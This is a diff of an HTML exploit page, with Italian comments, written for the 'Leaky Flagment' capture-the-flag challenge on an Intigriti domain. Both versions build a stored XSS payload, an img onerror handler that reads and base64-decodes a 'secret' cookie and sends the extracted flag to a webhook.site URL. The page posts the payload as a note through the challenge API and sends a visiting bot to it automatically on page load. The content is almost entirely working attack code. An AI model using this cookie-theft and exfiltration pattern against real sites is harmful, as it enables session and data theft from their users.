@@ -1,535 +1,129 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Leaky Flagment Child Window Exploit</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Leaky Flagment Solution</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             background: linear-gradient(to right, #ee9ca7, #ffdde1);
-            color: #333;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            padding: 20px;
-        }
-        .container {
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-            padding: 30px;
-            max-width: 600px;
-            width: 100%;
             text-align: center;
-            overflow: hidden;
         }
-        h1 {
-            color: #444;
-            margin-top: 0;
-        }
-        .info-text {
-            margin: 15px 0;
-            line-height: 1.5;
-        }
-        .status {
-            padding: 10px;
-            margin: 20px 0;
-            border-radius: 5px;
-            font-style: italic;
-        }
-        .info {
-            background-color: #d1ecf1;
-            color: #0c5460;
-        }
-        .success {
-            background-color: #d4edda;
-            color: #155724;
-        }
-        .error {
-            background-color: #f8d7da;
-            color: #721c24;
-        }
-        .loading {
-            display: inline-block;
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(238, 156, 167, 0.3);
-            border-radius: 50%;
-            border-top-color: #ee9ca7;
-            animation: spin 1s ease-in-out infinite;
-            margin: 10px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .button {
-            background-color: #ee9ca7;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s;
-            margin: 10px;
-        }
-        .button:hover {
-            background-color: #e67c8f;
-        }
-        .button:disabled {
-            background-color: #f8d7da;
-            cursor: not-allowed;
-            opacity: 0.7;
-        }
-        .big-button {
-            padding: 15px 30px;
-            font-size: 18px;
-            margin: 20px;
+        .target {
+            width: 300px;
+            height: 300px;
             background-color: #ff4081;
-        }
-        .big-button:hover {
-            background-color: #f50057;
-        }
-        .progress-container {
-            margin: 20px 0;
-            text-align: left;
-        }
-        .step {
-            padding: 8px;
-            margin: 5px 0;
-            border-radius: 4px;
-            position: relative;
-            padding-left: 35px;
-        }
-        .step:before {
-            content: "";
-            position: absolute;
-            left: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 18px;
-            height: 18px;
-            border-radius: 50%;
-            background-color: #e0e0e0;
-        }
-        .step.active:before {
-            background-color: #ee9ca7;
-            animation: pulse 1.5s infinite;
-        }
-        .step.completed:before {
-            background-color: #4caf50;
-            content: "✓";
             color: white;
-            text-align: center;
-            line-height: 18px;
-            font-size: 12px;
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto;
+            cursor: pointer;
+            animation: pulse 2s infinite;
+            font-size: 28px;
+            font-weight: bold;
         }
         @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(238, 156, 167, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(238, 156, 167, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(238, 156, 167, 0); }
-        }
-        .log {
-            max-height: 200px;
-            overflow-y: auto;
-            background-color: #f8f9fa;
-            border: 1px solid #eee;
-            border-radius: 5px;
-            padding: 10px;
-            margin: 20px 0;
-            text-align: left;
-            font-family: monospace;
-            font-size: 12px;
-        }
-        .child-window-info {
-            background-color: #fff3cd;
-            color: #856404;
-            padding: 10px;
-            border-radius: 5px;
-            border-left: 4px solid #ffeeba;
-            margin: 15px 0;
-        }
-        .note-url {
-            background-color: #f8f9fa;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-            font-family: monospace;
-            overflow-wrap: break-word;
-            word-break: break-all;
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 64, 129, 0.4); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(255, 64, 129, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 64, 129, 0); }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Leaky Flagment Child Window Exploit</h1>
-        
-        <p class="info-text">Questo exploit automaticamente crea una nota malevola e apre una finestra secondaria che visiterà la nota per rubare la flag.</p>
-        
-        <div id="statusMessage" class="status info">Pronto per avviare l'exploit...</div>
-        
-        <div id="childWindowInfo" class="child-window-info" style="display:none;">
-            <strong>Finestra Secondaria Aperta</strong>
-            <p>La finestra secondaria è stata aperta e verrà reindirizzata alla nota malevola per catturare la flag.</p>
-        </div>
-        
-        <div id="noteUrlContainer" style="display:none;">
-            <h3>URL Nota Malevola</h3>
-            <div id="noteUrl" class="note-url"></div>
-        </div>
-        
-        <div class="progress-container">
-            <div id="step1" class="step">1. Apertura finestra secondaria</div>
-            <div id="step2" class="step">2. Creazione nota malevola con payload XSS</div>
-            <div id="step3" class="step">3. Reindirizzamento finestra secondaria alla nota</div>
-            <div id="step4" class="step">4. Estrazione e invio della flag</div>
-        </div>
-        
-        <div id="logContainer">
-            <div id="log" class="log"></div>
-        </div>
-        
-        <div id="controlsContainer">
-            <button id="startButton" class="button big-button">Avvia Exploit</button>
-            <div id="loadingIndicator" class="loading" style="display:none;"></div>
-        </div>
+    <div class="target" id="target">
+        CLICCA QUI
     </div>
 
     <script>
-        // Elementi DOM
-        const statusMessage = document.getElementById('statusMessage');
-        const startButton = document.getElementById('startButton');
-        const loadingIndicator = document.getElementById('loadingIndicator');
-        const childWindowInfo = document.getElementById('childWindowInfo');
-        const noteUrlContainer = document.getElementById('noteUrlContainer');
-        const noteUrl = document.getElementById('noteUrl');
-        const logElement = document.getElementById('log');
-        const step1 = document.getElementById('step1');
-        const step2 = document.getElementById('step2');
-        const step3 = document.getElementById('step3');
-        const step4 = document.getElementById('step4');
+        // Ottieni un ID casuale per l'exploit
+        const exploitId = Math.floor(Math.random() * 1000000);
         
         // URL del webhook
         const webhookUrl = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a';
         
-        // Variabili di stato
-        let childWindow = null;
-        let exploitRunning = false;
-        let noteId = null;
-        let exploitId = Math.floor(Math.random() * 1000000);
+        // Payload XSS
+        const xssPayload = `<img src=x onerror="(function(){
+            // Estrae il cookie 'secret'
+            const cookie = document.cookie.split(';').find(c => c.trim().startsWith('secret='));
+            if (!cookie) return;
+            
+            // Decodifica il cookie base64
+            const secretValue = cookie.split('=')[1].trim();
+            const decodedSecret = atob(secretValue);
+            
+            // Estrae la flag (parte dopo i due punti)
+            const colonIndex = decodedSecret.indexOf(':');
+            if (colonIndex === -1) return;
+            
+            const flag = decodedSecret.substring(colonIndex + 1);
+            
+            // Invia la flag al webhook tramite immagine (aggira CORS)
+            const img = new Image();
+            img.src = '${webhookUrl}?flag=' + encodeURIComponent(flag);
+            document.body.appendChild(img);
+        })()">`;
         
-        // Aggiunge un log
-        function addLog(message, isError = false) {
-            const logEntry = document.createElement('div');
-            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            if (isError) {
-                logEntry.style.color = '#dc3545';
-            }
-            logElement.appendChild(logEntry);
-            logElement.scrollTop = logElement.scrollHeight;
-            console.log(message);
+        // Funzione per avviare l'exploit
+        function runExploit() {
+            // Crea un documento HTML che crea la nota XSS
+            const html = `
+            <!DOCTYPE html>
+            <html>
+            <body>
+                <h1>Creazione nota...</h1>
+                <script>
+                    window.onload = function() {
+                        console.log('Creazione della nota malevola...');
+                        
+                        fetch('https://challenge-0325.intigriti.io/api/post', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                title: 'Note ${exploitId}',
+                                content: ${JSON.stringify(xssPayload)},
+                                use_password: 'false'
+                            }),
+                            credentials: 'include'
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Nota creata con ID:', data.id);
+                            // Reindirizza alla nota per attivare l'XSS
+                            window.location.href = 'https://challenge-0325.intigriti.io/note/' + data.id;
+                        })
+                        .catch(error => {
+                            console.error('Errore:', error);
+                            document.body.innerHTML += '<p>Errore: ' + error.message + '</p>';
+                        });
+                    };
+                <\/script>
+            </body>
+            </html>
+            `;
+            
+            // Crea un blob e un URL per il documento HTML
+            const blob = new Blob([html], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+            
+            // Reindirizza al documento HTML che creerà la nota
+            window.location.href = url;
         }
         
-        // Aggiorna lo stato
-        function updateStatus(message, type = 'info') {
-            statusMessage.textContent = message;
-            statusMessage.className = `status ${type}`;
-            addLog(message, type === 'error');
-        }
+        // Aggiungi l'handler del click
+        document.getElementById('target').addEventListener('click', runExploit);
         
-        // Aggiorna lo stato del passo
-        function updateStep(step, status) {
-            step.classList.remove('active', 'completed');
-            if (status === 'active') {
-                step.classList.add('active');
-            } else if (status === 'completed') {
-                step.classList.add('completed');
-            }
-        }
-        
-        // Apre la finestra secondaria
-        function openChildWindow() {
-            if (childWindow && !childWindow.closed) {
-                addLog('La finestra secondaria è già aperta');
-                return childWindow;
-            }
-            
-            // Apre una finestra vuota in attesa della nota
-            childWindow = window.open('about:blank', 'LeakyFlagmentExploit', 'width=800,height=600');
-            
-            if (!childWindow) {
-                throw new Error('Impossibile aprire la finestra secondaria. Potrebbe essere stato bloccato dal browser.');
-            }
-            
-            // Visualizza l'informazione sulla finestra secondaria
-            childWindowInfo.style.display = 'block';
-            
-            return childWindow;
-        }
-        
-        // Crea una nota malevola
-        async function createMaliciousNote() {
-            updateStep(step2, 'active');
-            updateStatus('Creazione della nota malevola in corso...', 'info');
-            
-            try {
-                // Payload XSS
-                const payload = `<img src=x onerror="(function(){
-                    try {
-                        console.log('Esecuzione payload XSS');
-                        
-                        // Estrae il cookie secret
-                        const cookie = document.cookie.split(';').find(c => c.trim().startsWith('secret='));
-                        if (!cookie) {
-                            console.error('Cookie non trovato');
-                            return;
-                        }
-                        
-                        // Decodifica il cookie
-                        const secretValue = cookie.split('=')[1].trim();
-                        const decodedSecret = atob(secretValue);
-                        console.log('Secret decodificato:', decodedSecret);
-                        
-                        // Estrae la flag dopo i due punti
-                        const colonIndex = decodedSecret.indexOf(':');
-                        if (colonIndex === -1) {
-                            console.error('Formato cookie non valido');
-                            return;
-                        }
-                        
-                        const flag = decodedSecret.substring(colonIndex + 1);
-                        console.log('Flag trovata:', flag);
-                        
-                        // Invia la flag al webhook
-                        const methods = [];
-                        
-                        // 1. Via immagine (funziona anche con CORS)
-                        try {
-                            const img = new Image();
-                            img.src = '${webhookUrl}?flag=' + encodeURIComponent(flag) + '&id=${exploitId}&via=img&time=' + Date.now();
-                            document.body.appendChild(img);
-                            methods.push('img');
-                        } catch(e) {
-                            console.error('Errore invio via img:', e);
-                        }
-                        
-                        // 2. Via fetch
-                        try {
-                            fetch('${webhookUrl}', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ 
-                                    flag: flag, 
-                                    id: '${exploitId}',
-                                    via: 'fetch',
-                                    userAgent: navigator.userAgent,
-                                    timestamp: new Date().toISOString()
-                                })
-                            }).then(() => console.log('Flag inviata via fetch'));
-                            methods.push('fetch');
-                        } catch(e) {
-                            console.error('Errore invio via fetch:', e);
-                        }
-                        
-                        // 3. Via sendBeacon (funziona anche quando la pagina viene chiusa)
-                        try {
-                            if (navigator.sendBeacon) {
-                                const data = new FormData();
-                                data.append('flag', flag);
-                                data.append('id', '${exploitId}');
-                                data.append('via', 'beacon');
-                                data.append('timestamp', new Date().toISOString());
-                                navigator.sendBeacon('${webhookUrl}', data);
-                                methods.push('beacon');
-                            }
-                        } catch(e) {
-                            console.error('Errore invio via beacon:', e);
-                        }
-                        
-                        // Mostra successo nella pagina
-                        const successEl = document.createElement('div');
-                        successEl.style.position = 'fixed';
-                        successEl.style.top = '0';
-                        successEl.style.left = '0';
-                        successEl.style.right = '0';
-                        successEl.style.padding = '20px';
-                        successEl.style.background = '#d4edda';
-                        successEl.style.color = '#155724';
-                        successEl.style.textAlign = 'center';
-                        successEl.style.zIndex = '9999';
-                        successEl.innerHTML = 'Flag estratta con successo e inviata al webhook! Metodi: ' + methods.join(', ');
-                        document.body.appendChild(successEl);
-                        
-                        console.log('Flag inviata al webhook via', methods.join(', '));
-                    } catch(e) {
-                        console.error('Errore durante estrazione flag:', e);
-                    }
-                })()">`;
-                
-                // Crea la nota
-                const response = await fetch('https://challenge-0325.intigriti.io/api/post', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': '*/*'
-                    },
-                    body: JSON.stringify({
-                        title: `Documento Importante ${exploitId}`,
-                        content: payload,
-                        use_password: 'false'
-                    })
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`Errore nella creazione della nota: ${response.status}`);
-                }
-                
-                const data = await response.json();
-                addLog('Risposta API: ' + JSON.stringify(data));
-                
-                if (!data.id) {
-                    throw new Error('ID nota non trovato nella risposta');
-                }
-                
-                noteId = data.id;
-                const fullNoteUrl = `https://challenge-0325.intigriti.io/note/${noteId}`;
-                
-                // Mostra l'URL della nota creata
-                noteUrl.textContent = fullNoteUrl;
-                noteUrlContainer.style.display = 'block';
-                
-                addLog('Nota malevola creata con successo');
-                addLog('ID nota: ' + noteId);
-                addLog('URL: ' + fullNoteUrl);
-                
-                // Notification webhook
-                fetch(`${webhookUrl}?event=note_created&id=${noteId}&exploitId=${exploitId}&time=${Date.now()}`);
-                
-                updateStep(step2, 'completed');
-                return fullNoteUrl;
-                
-            } catch (error) {
-                updateStatus('Errore nella creazione della nota: ' + error.message, 'error');
-                addLog(error.stack, true);
-                updateStep(step2, '');
-                throw error;
-            }
-        }
-        
-        // Reindirizza la finestra secondaria alla nota
-        function redirectChildWindow(url) {
-            updateStep(step3, 'active');
-            updateStatus('Reindirizzamento della finestra secondaria alla nota malevola...', 'info');
-            
-            try {
-                if (!childWindow || childWindow.closed) {
-                    throw new Error('La finestra secondaria è stata chiusa');
-                }
-                
-                // Reindirizza la finestra alla nota
-                childWindow.location.href = url;
-                addLog('Finestra secondaria reindirizzata a: ' + url);
-                
-                // Notification webhook
-                fetch(`${webhookUrl}?event=child_redirected&id=${noteId}&exploitId=${exploitId}&time=${Date.now()}`);
-                
-                updateStep(step3, 'completed');
-                updateStep(step4, 'active');
-                updateStatus('In attesa dell\'esecuzione del payload XSS...', 'info');
-                
-                return true;
-            } catch (error) {
-                updateStatus('Errore nel reindirizzamento della finestra: ' + error.message, 'error');
-                addLog(error.stack, true);
-                updateStep(step3, '');
-                throw error;
-            }
-        }
-        
-        // Funzione principale dell'exploit
-        async function runExploit() {
-            if (exploitRunning) return;
-            exploitRunning = true;
-            
-            try {
-                // Nascondi il pulsante e mostra il loading
-                startButton.style.display = 'none';
-                loadingIndicator.style.display = 'inline-block';
-                
-                updateStatus('Exploit in esecuzione...', 'info');
-                addLog('Avvio exploit con ID: ' + exploitId);
-                
-                // Passo 1: Apertura finestra secondaria
-                updateStep(step1, 'active');
-                const childWin = openChildWindow();
-                await new Promise(r => setTimeout(r, 1000));
-                updateStep(step1, 'completed');
-                
-                // Passo 2 e 3: Creazione nota malevola e reindirizzamento
-                const noteUrl = await createMaliciousNote();
-                await new Promise(r => setTimeout(r, 1000));
-                redirectChildWindow(noteUrl);
-                
-                // Completa l'exploit
-                updateStatus('Exploit completato con successo! Attendi l\'esecuzione del payload XSS nella finestra secondaria.', 'success');
-                
-                // Nascondi il loading
-                loadingIndicator.style.display = 'none';
-                
-                // Mostra un pulsante per riavviare l'exploit
-                startButton.textContent = 'Riavvia Exploit';
-                startButton.style.display = 'inline-block';
-                exploitRunning = false;
-                
-                // Timer per il completamento automatico dell'ultimo passaggio
-                setTimeout(() => {
-                    updateStep(step4, 'completed');
-                    addLog('Processo completato. Controlla il webhook per la flag.');
-                }, 10000);
-                
-            } catch (error) {
-                exploitRunning = false;
-                updateStatus('Errore nell\'esecuzione dell\'exploit: ' + error.message, 'error');
-                addLog(error.stack, true);
-                
-                // Ripristina l'interfaccia
-                loadingIndicator.style.display = 'none';
-                startButton.textContent = 'Riprova';
-                startButton.style.display = 'inline-block';
-                
-                // Reset step
-                [step1, step2, step3, step4].forEach(step => {
-                    step.classList.remove('active', 'completed');
-                });
-            }
-        }
-        
-        // Listener per il pulsante di avvio
-        startButton.addEventListener('click', runExploit);
-        
-        // Inizializzazione
-        window.onload = function() {
-            addLog('Exploit inizializzato');
-            addLog('Webhook configurato: ' + webhookUrl);
-            addLog('ID exploit: ' + exploitId);
-            
-            // Avvio automatico per il bot
-            if (new URLSearchParams(window.location.search).get('auto') === 'true') {
-                addLog('Modalità automatica rilevata');
-                // Breve ritardo per assicurarsi che la pagina sia caricata
-                setTimeout(runExploit, 1000);
-            }
-        };
-        
-        // Gestione della chiusura della finestra secondaria
-        window.addEventListener('beforeunload', function() {
-            if (childWindow && !childWindow.closed) {
-                childWindow.close();
-            }
-        });
+        // Per il bot: avvia automaticamente l'exploit dopo un breve ritardo
+        // Il bot clicca sempre al centro della pagina
+        setTimeout(runExploit, 1000);
     </script>
 </body>
 </html>
